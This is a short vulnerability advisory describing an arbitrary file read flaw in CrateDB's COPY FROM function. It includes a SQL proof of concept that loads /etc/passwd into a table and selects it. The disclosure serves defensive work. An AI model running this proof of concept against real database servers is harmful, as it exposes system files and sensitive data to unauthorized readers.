## Summary

There is an arbitrary file read vulnerability in the CrateDB database, and authenticated
CrateDB database users can read any file on the system.

## Details

There is a `COPY FROM` function in the CrateDB database that is used to import file data
into database tables. This function has a flaw, and authenticated attackers can abuse
the `COPY FROM` function to read arbitrary files from the underlying operating system,
resulting in sensitive information disclosure.

## PoC

```sql
CREATE TABLE info_leak (
    info_leak STRING
);

COPY info_leak FROM '/etc/passwd'
WITH (
    format = 'csv',
    header = false
);

SELECT * FROM info_leak;
